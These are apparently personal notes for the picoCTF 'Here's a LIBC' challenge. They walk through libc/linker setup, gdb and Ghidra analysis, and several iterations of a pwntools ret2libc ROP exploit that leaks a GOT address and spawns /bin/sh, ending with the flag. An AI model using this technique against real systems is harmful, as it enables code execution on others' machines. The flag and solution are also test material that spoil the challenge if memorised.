https://www.youtube.com/watch?v=tMN5N5oid2c
https://play.picoctf.org/practice/challenge/179?category=6&originalEvent=34&page=1
Here's a LIBC

# **Getting Everything Ready**
gdb gef - https://github.com/hugsy/gef
pwntools (pip3 install pwn)

wget vuln, libc.so.6, makefile
`ldd vuln` (libraries loaded)
```bash
linux-vdso.so.1 (0x00007ffe2e5e8000)
libc.so.6 => ./libc.so.6 (0x00007ff6be000000)
/lib64/ld-linux-x86-64.so.2 (0x00007ff6be75b000)
```

We need to determine the version of the libc:
1. we can try to execute it -> (it fails when we try it)
2. Open it
3. Strings (grep for gcc, version)

`strings ./libc.so.6 | grep -i version`
`GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.`
We got the version: `Ubuntu GLIBC 2.27-3ubuntu1.2`

then we need to grab the linker, 
`locate libc.so.6`
check the version your linux is using with `/usr/lib/x86_64-linux-gnu/libc.so.6` 
```
	/usr/lib/x86_64-linux-gnu/libc.so.6    
GNU C Library (Debian GLIBC 2.38-13) stable release version 2.38.
```
(not the same version as 2.27)

run docker containers with older version (tedious, but its an option)

instead we can use pwninit (will grab symbols for us)
https://github.com/io12/pwninit/releases/download/3.3.1/pwninit
`./pwninit --bin vuln --libc libc.so.6` (it will determine that we need a certain linker, in this case `ld-2.27.so`)

`./ld-2.27.so ./vuln` (running the vulnerable program with the right linker it will run like the original vulnerable program)

running the vulnerable program without specifying the linker it wouldn't work, so we use patchelf to modify the binary to strictly use a certain linker `patchelf --set-interpreter ./ld-2.27.so ./vuln`
now the program runs normally

# **Now That The Hardest Part is Done**
1. check protections: `checksec ./vuln`
```
	Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./'
    Stripped:   No
```
RELRO = The global offset table is readble and writable, 
Stack = no canary so we don't need to worry about leaking the canary
NX = any segment of memory that is writable is not executable, cant just write shellcode and jump to it
PIE = ASLR won't affect the binary, everytime the binary is run the actual base adress is gonna be `0x400000` its alway gonna be there
RUNPATH = the path of the libraries the binary wants to load and run

2. Open it in Ghidra
look into the main function (puts) - rename variables
look for the suspect function (scanf) - rename variables
&DAT_0040093a -> 2x click -> %c -> Retype global -> char[2]
see the buffer, after the scanf
see that if we input more than the buffer it gives a segmentation fault error

 3. Debuggin it with gdb
 `r` to run it
 (examine the results)
 `x/gx $rsp` (examine/8 bytes hexadecimal $pointer_to_stack) $rsp = scanf??
 `0x7fffffffdcd8: 0x4141414141414141`, that read instruction will put `0x41`... = A(16) in the rip but `0x41`... doesn't point to a valid area in memory isn't gonna execute the read instruction

We know we have to overflow it, we know we have control of the value on the stack that will eventually be put in the instruction pointer, configure out how many bytes it'll take before it gets to that instruction pointer

Using `pattern` (similar to metasploit), but before we have to go back to ghidra to configure out how many bytes we want to put in.
Since the allocated buffer is 112, we will put 200 (redounded to the hundreds)
`pattern create 200` (creates a "De Bruijn sequence" with 200 bytes)
run the program again with `r` and input that sequence
see that rsp is pointing to our string
`pattern offset $rsp`
```
[+] Found at offset 136 (little-endian search) likely
```
check if its overflowing: `pattern create 136`, run the program again with `r` and input that sequence with more A's to see that it is overflowing

# **Time to xploit**
ASLR changes the address but the offset stays the same
PLT (Procedure Linking Table) and GOT (Global Offset Table)
back to ghidra and we go to the scanf -> 2x click -> .plt (search for scanf) -> .got.plt section -> search for scanf
We want to find a way to print the value of the adress of scanf -> search for puts or printf (only function we have that we know the address of) -> will allow us to leak memory
(value after the scanf function is the GOT) we have a value inside our binary that we know  a libc address is gonna exist

ROPgadgets is sequence of instructions that end in a return instruction. 
We can use Ghidra (manual), or ropper / ropgadget (tools)
With ROPgadget: `ROPgadget --binary vuln`

script to leak the address:
```python
#!/usr/bin/env python3

from pwn import *

p = process('./vuln') #run the vulnerable program

offset = 136 #we discovered that with 'pattern offset $rsp'
junk = b"A" * offset #creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (ROPgadget --bin vuln)
scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the libc function scanf in ghidra
puts_at_plt = 0x400540 # 00400540, address of .plt section of the libc function puts in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packing in x64
	p64(scanf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

p.interactive()
```

progressing on the exploit
```python
#!/usr/bin/env python3

from pwn import *

p = process('./vuln') # start the vulnerable program process

offset = 136 # we discovered that with 'pattern offset $rsp'
junk = b"A" * offset # creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (ROPgadget --bin vuln)
scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the libc function scanf in ghidra
puts_at_plt = 0x400540 # 00400540, address of .plt section of the libc function puts in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packs the integers into bytes (returns a 64-bit little-endian byte string representation as a hexadecimal-encoded string)
	p64(scanf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

# to get the leaked address
p.recvline()
p.recvline()

# unpack it and save the leak address, strip the \n, and adjusts the string padded with 8 bytes 
# and suffix it with null bytes and turn it into hexadecimal
leak = u64(p.recvline().strip().ljust(8, b"\x00")) 

log.info(f"{hex(leak)=}") # get the leaked address

"""
Plan to calculate the offset (getting the difference between the leaked address and the system address)
between scanf (function we leaked) and system (function we want to call )

readelf -s ./libc.so.6 | grep scanf (print the address of scanf)
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
"""
scanf_offset = 0x7b0b0

# Now we take our leaked address and subtract 0x7b0b0, and then we find the actual loaded address of libc
base_address_of_libc = leak - scanf_offset

"""
calcule the address of function system

readelf -s //libc.so.6 | grep system
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
"""
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset # get the actual physical in memory address of system

"""
check if /bin/sh is in libc.so.6
strings libc.so.6 | grep /bin/sh
"""

p.interactive()

```

Our payload with 2 ROPchains that got us to EOF (End Of File)
```python
#!/usr/bin/env python3

from pwn import *

p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
gdb.attach(p) # debug our ROPchain

offset = 136 # we discovered that with 'pattern offset $rsp'
junk = b"A" * offset # creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (`ROPgadget --bin vuln`)
scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the scanf function in ghidra
puts_at_plt = 0x400540 # 00400540, address of .plt section of the puts function in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packs the integers into bytes (returns a 64-bit little-endian byte string representation as a hexadecimal-encoded string)
	p64(scanf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

# to get the leaked address
p.recvline()
p.recvline()

# unpack it and save the leak address, strip the \n, and adjusts the string padded with 8 bytes 
# and suffix it with null bytes and turn it into hexadecimal
leak = u64(p.recvline().strip().ljust(8, b"\x00")) 

log.info(f"{hex(leak)=}") # get the leaked address

"""
Plan to calculate the offset (getting the difference between the leaked address and the system address)
between scanf (function we leaked) and system (function we want to call )

`readelf -s ./libc.so.6 | grep scanf (print the address of scanf)`
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
"""
scanf_offset = 0x7b0b0

# Now we take our leaked address and subtract 0x7b0b0, and then we find the actual loaded address of libc
base_address_of_libc = leak - scanf_offset

"""
calcule the address of function system

`readelf -s //libc.so.6 | grep system`
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
"""
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset # get the actual physical in memory address of system

"""
check if /bin/sh is in libc.so.6
`strings libc.so.6 | grep /bin/sh`, check there is
"""

"""
open libc.so.6 in ghidra (don't scan it)
search memory (press s), change Format from hex to string and search for /bin/sh
002b40fa
"""
bin_sh_offset = 0x2b40fa
bin_sh_address = base_address_of_libc + bin_sh_offset

# second ROPchain (payload), now that its waiting to receive input

second_payload = [
	junk, # get back to the offset, where we know our instruction pointer will end up going, buffer overflow
	p64(pop_rdi), # supply an argument to a function that we end up calling, system 
	p64(bin_sh_address), # string to /bin/sh
	p64(system_address), # passing that to system
]

# prepare our second payload
second_payload = b''.join(second_payload)
p.sendline(second_payload)


p.interactive()

```

Now we go back to ghidra in our vuln program, and look for the suspected function and click on return, and see the address `00400770`

Now we debug our ROPchain `gdb.attach(p)`
and set a breakpoint to that address `b *0x400770`
and `c` for continue
`si` to go the next instruction
until we reach `0x400914 <__libc_csu_init+0064> ret`
examine what is rdi `x/gx $rdi`
Realize something is wrong, check the leaked address and spot the error
with gdb, set breakpoint in main `b main` and continue `c`
See the leaked address (in our script), copy it and examine it in gdb `x 0x7f798ac7bf30`
it should say scanf (it does)
We are getting the leaked address but the actual address is wrong
The issue is that its getting to `__isoc99_scanf`and not `scanf`
using `readelf -s ./libc.so.6 | grep __isoc99_scanf`, (I get a result, but in the video no)
So we change from scanf to puts, and from puts to setbuf

Updated script at the moment 
```python
#!/usr/bin/env python3

from pwn import *

p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
gdb.attach(p) # debug our ROPchain

offset = 136 # we discovered that with 'pattern offset $rsp'
junk = b"A" * offset # creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (`ROPgadget --bin vuln`)
# scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the scanf function in ghidra
# puts_at_got = 0x601018 # same as the scanf_at_got, but we changed the function to leak the address
setbuf_at_got = 0x601028 # same as the above, but we changed the function once again to leak the address

puts_at_plt = 0x400540 # 00400540, address of .plt section of the puts function in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packs the integers into bytes (returns a 64-bit little-endian byte string representation as a hexadecimal-encoded string)
	p64(setbuf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

# to get the leaked address
p.recvline()
p.recvline()

# unpack it and save the leak address, strip the \n, and adjusts the string padded with 8 bytes 
# and suffix it with null bytes and turn it into hexadecimal
leak = u64(p.recvline().strip().ljust(8, b"\x00")) 

log.info(f"{hex(leak)=}") # get the leaked address

"""
Plan to calculate the offset (getting the difference between the leaked address and the system address)
between scanf (function we leaked) and system (function we want to call )

`readelf -s ./libc.so.6 | grep scanf` (print the address of scanf)
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
"""
# scanf_offset = 0x7b0b0

"""
we changed the function from scanf to puts
`readelf -s ./libc.so.6 | grep puts` (print the address of puts)
422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
"""
# puts_offset = 0x80a30

"""
we changed from puts to setbuf
`readelf -s ./libc.so.6 | grep setbuf` (prints the address of setbuf)
2185: 0000000000088540    10 FUNC    GLOBAL DEFAULT   13 setbuf@@GLIBC_2.2.5
"""
setbuf_offset = 0x88540

# Now we take our leaked address and subtract 0x7b0b0, and then we find the actual loaded address of libc
base_address_of_libc = leak - setbuf_offset

log.info(f"{hex(base_address_of_libc)=}") # check if everything is right in our ROPchain, we could see that it isn't leaking right

"""
calcule the address of function system

`readelf -s //libc.so.6 | grep system`
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
"""
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset # get the actual physical in memory address of system

"""
check if /bin/sh is in libc.so.6
`strings libc.so.6 | grep /bin/sh`, check there is
"""

"""
open libc.so.6 in ghidra (don't scan it)
search memory (press s), change Format from hex to string and search for /bin/sh
002b40fa
"""
bin_sh_offset = 0x2b40fa
bin_sh_address = base_address_of_libc + bin_sh_offset

# second ROPchain (payload), now that its waiting to receive input

second_payload = [
	junk, # get back to the offset, where we know our instruction pointer will end up going, buffer overflow
	p64(pop_rdi), # supply an argument to a function that we end up calling, system 
	p64(bin_sh_address), # string to /bin/sh
	p64(system_address), # passing that to system
]

# prepare our second payload
second_payload = b''.join(second_payload)
p.sendline(second_payload)


p.interactive()

```

run the script, it opens a gdb window, input `c` 
and `telescope $rsp-32` (find our payload)
(Something is wrong)
We now want to know what is the layout of the stack before and after we put our payload
Run the script, it opens a gdb window, set 2 breakpoints: 1: `b do_stuff`, 
`disassemble do_stuff`, (grab address of ret instruction), and 2:`b *0x400770`
`c` for continue, and its gonna leak our ROPchain, `si`, `enter`, until we reach 
`0x400914 <__libc_csu_init+0064> ret` (puts), and see that rdi prints our setbuf function
`c` continue, back to our script and see that it leaked the address,
check leaked address `x 0x7fae1f688540` (0x7fae1f688540 was the address that was leaked),
it gives this `0x7fae1f688540 <setbuf>:        0x002000ba` (as we intended),
and with `vm` check that the libc address (2nd address in the script) is in libc.so.6 's path
`p system - 0x00007fae1f600000` (libc address above), check that it matches our system_offset



everything is good, `si`, `ni` (next instruction), go right before it calls scanf (that will receive our input), stop at `0x4006fe <do_stuff+0026>  call   0x400580 <__isoc99_scanf@plt>`
copy the rsi value `0x00007fff0399ef80`, `ni`, `telescope 0x00007fff0399ef80` (see that it has our payload), `telescope 0x00007fff0399ef80 -l 64` (to see more),
after the `pop rdi` instruction it should have our /bin/sh but it doesn't, so our /bin/sh is wrong
`grep /bin/sh` (look for /bin/sh), we get 
`0x7fae1f7b40fa - 0x7fae1f7b4101  →   "/bin/sh"`, 
`x/s 0x7fae1f7b40fa` (see that we get string /bin/sh), `0x7fae1f7b40fa: "/bin/sh"`
(find the /bin/sh offset) `p 0x7fae1f7b40fa - 0x00007fae1f600000` (p 0x00007fae1f600000 from libc address 12 above), we get `$2 = 0x1b40fa` (check that it matches our bin_sh_offset)

we still don't have a shell, so something is missing
run the script once again, it will open a gdb window, `disassemble do_stuff`, (grab address of ret instruction), `b *0x400770`, `c`, `c`, `si`, verify that we have our /bin/sh on the stack, `si`, `si`, verify that rdi is the actual address of libc, it still gives an error and it is segmentation faulting because the libc is using our system linker (the exploit works)

WORKING EXPLOIT
```python
#!/usr/bin/env python3

from pwn import *

p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
gdb.attach(p) # debug our ROPchain

offset = 136 # we discovered that with 'pattern offset $rsp'
junk = b"A" * offset # creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (`ROPgadget --bin vuln`)
# scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the scanf function in ghidra
# puts_at_got = 0x601018 # same as the scanf_at_got, but we changed the function to leak the address
setbuf_at_got = 0x601028 # same as the above, but we changed the function once again to leak the address

puts_at_plt = 0x400540 # 00400540, address of .plt section of the puts function in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packs the integers into bytes (returns a 64-bit little-endian byte string representation as a hexadecimal-encoded string)
	p64(setbuf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

# to get the leaked address
p.recvline()
p.recvline()

# unpack it and save the leak address, strip the \n, and adjusts the string padded with 8 bytes 
# and suffix it with null bytes and turn it into hexadecimal
leak = u64(p.recvline().strip().ljust(8, b"\x00")) 

log.info(f"{hex(leak)=}") # get the leaked address

"""
Plan to calculate the offset (getting the difference between the leaked address and the system address)
between scanf (function we leaked) and system (function we want to call )

`readelf -s ./libc.so.6 | grep scanf` (print the address of scanf)
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
"""
# scanf_offset = 0x7b0b0

"""
we changed the function from scanf to puts
`readelf -s ./libc.so.6 | grep puts` (print the address of puts)
422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
"""
# puts_offset = 0x80a30

"""
we changed from puts to setbuf
`readelf -s ./libc.so.6 | grep setbuf` (prints the address of setbuf)
2185: 0000000000088540    10 FUNC    GLOBAL DEFAULT   13 setbuf@@GLIBC_2.2.5
"""
setbuf_offset = 0x88540

# Now we take our leaked address and subtract 0x7b0b0, and then we find the actual loaded address of libc
base_address_of_libc = leak - setbuf_offset

log.info(f"{hex(base_address_of_libc)=}") # check if everything is right in our ROPchain, we could see that it isn't leaking right

"""
calcule the address of function system

`readelf -s ./libc.so.6 | grep system`
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
"""
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset # get the actual physical in memory address of system

"""
check if /bin/sh is in libc.so.6
`strings libc.so.6 | grep /bin/sh`, check there is
"""

"""
open libc.so.6 in ghidra (don't scan it)
search memory (press s), change Format from hex to string and search for /bin/sh
002b40fa
"""
bin_sh_offset = 0x1b40fa # it was 0x2b40fa, +100000 because of ghidra had a base address of 0x100000 (thats why its +100000)
bin_sh_address = base_address_of_libc + bin_sh_offset

# second ROPchain (payload), now that its waiting to receive input

second_payload = [
	junk, # get back to the offset, where we know our instruction pointer will end up going, buffer overflow
	p64(pop_rdi), # supply an argument to a function that we end up calling, system 
	p64(bin_sh_address), # string to /bin/sh
	p64(system_address), # passing that to system
]

# prepare our second payload
second_payload = b''.join(second_payload)
p.sendline(second_payload)


p.interactive()

```

we tried to change 
```python
p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
gdb.attach(p) # debug our ROPchain
```
to
```python
p = remote('mercury.picoctf.net', 37289)
```
but it doesn't work because its stack alligned

`ROPgadget --binary vuln | grep -i ": ret"` (search for any ret instruction), 
`0x000000000040052e : ret`, we will use 0x40052e

FINALLY WORKING WORKING EXPLOIT (only works locally)
```python
#!/usr/bin/env python3

from pwn import *

p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
# gdb.attach(p) # debug our ROPchain

# p = remote('mercury.picoctf.net', 37289)

offset = 136 # we discovered that with 'pattern offset $rsp'
junk = b"A" * offset # creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (`ROPgadget --bin vuln`)
# scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the scanf function in ghidra
# puts_at_got = 0x601018 # same as the scanf_at_got, but we changed the function to leak the address
setbuf_at_got = 0x601028 # same as the above, but we changed the function once again to leak the address

puts_at_plt = 0x400540 # 00400540, address of .plt section of the puts function in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packs the integers into bytes (returns a 64-bit little-endian byte string representation as a hexadecimal-encoded string)
	p64(setbuf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

# to get the leaked address
p.recvline()
p.recvline()

# unpack it and save the leak address, strip the \n, and adjusts the string padded with 8 bytes 
# and suffix it with null bytes and turn it into hexadecimal
leak = u64(p.recvline().strip().ljust(8, b"\x00")) 

log.info(f"{hex(leak)=}") # get the leaked address

"""
Plan to calculate the offset (getting the difference between the leaked address and the system address)
between scanf (function we leaked) and system (function we want to call )

`readelf -s ./libc.so.6 | grep scanf` (print the address of scanf)
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
"""
# scanf_offset = 0x7b0b0

"""
we changed the function from scanf to puts
`readelf -s ./libc.so.6 | grep puts` (print the address of puts)
422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
"""
# puts_offset = 0x80a30

"""
we changed from puts to setbuf
`readelf -s ./libc.so.6 | grep setbuf` (prints the address of setbuf)
2185: 0000000000088540    10 FUNC    GLOBAL DEFAULT   13 setbuf@@GLIBC_2.2.5
"""
setbuf_offset = 0x88540

# Now we take our leaked address and subtract 0x7b0b0, and then we find the actual loaded address of libc
base_address_of_libc = leak - setbuf_offset

log.info(f"{hex(base_address_of_libc)=}") # check if everything is right in our ROPchain, we could see that it isn't leaking right

"""
calcule the address of function system

`readelf -s ./libc.so.6 | grep system`
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
"""
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset # get the actual physical in memory address of system

"""
check if /bin/sh is in libc.so.6
`strings libc.so.6 | grep /bin/sh`, check there is
"""

"""
open libc.so.6 in ghidra (don't scan it)
search memory (press s), change Format from hex to string and search for /bin/sh
002b40fa
"""
bin_sh_offset = 0x1b40fa # it was 0x2b40fa, +100000 because of ghidra had a base address of 0x100000 (thats why its +100000)
bin_sh_address = base_address_of_libc + bin_sh_offset

ret_instruction = 0x40052e # `ROPgadget --binary vuln | grep -i ": ret"` (searching for ret intructions)

# second ROPchain (payload), now that its waiting to receive input

second_payload = [
	junk, # get back to the offset, where we know our instruction pointer will end up going, buffer overflow
	p64(pop_rdi), # supply an argument to a function that we end up calling, system 
	p64(bin_sh_address), # string to /bin/sh
	p64(ret_instruction), # so that whenever we call a sytem function, the last digit is a 0, basically for stack allignment
	p64(system_address), # passing that to system
]

# prepare our second payload
second_payload = b''.join(second_payload)
p.sendline(second_payload)


p.interactive()

```

for the exploit to work and solve the CTF
change
```python
p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
# gdb.attach(p) # debug our ROPchain

# p = remote('mercury.picoctf.net', 37289)
``` 
to
```python
p = remote('mercury.picoctf.net', 37289)
```
picoCTF{1_<3_sm4sh_st4cking_e900800fb4613d1e}